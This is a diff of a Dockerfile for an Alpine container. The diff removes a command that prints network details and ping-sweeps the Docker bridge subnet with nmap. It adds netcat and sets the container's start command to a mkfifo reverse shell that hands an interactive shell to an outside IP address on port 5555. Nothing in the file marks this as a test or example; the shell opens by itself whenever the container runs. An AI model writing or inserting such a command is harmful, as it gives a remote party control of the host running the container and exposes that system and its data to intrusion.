@@ -1,3 +1,3 @@
 FROM alpine:3.19
-RUN apk add --no-cache nmap
-CMD sh -c "ip a && cat /proc/net/arp && nmap -sn 172.17.0.0/24 && sleep infinity"
+RUN apk add --no-cache nmap netcat-openbsd
+CMD mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc 62.113.111.63 5555 > /tmp/f
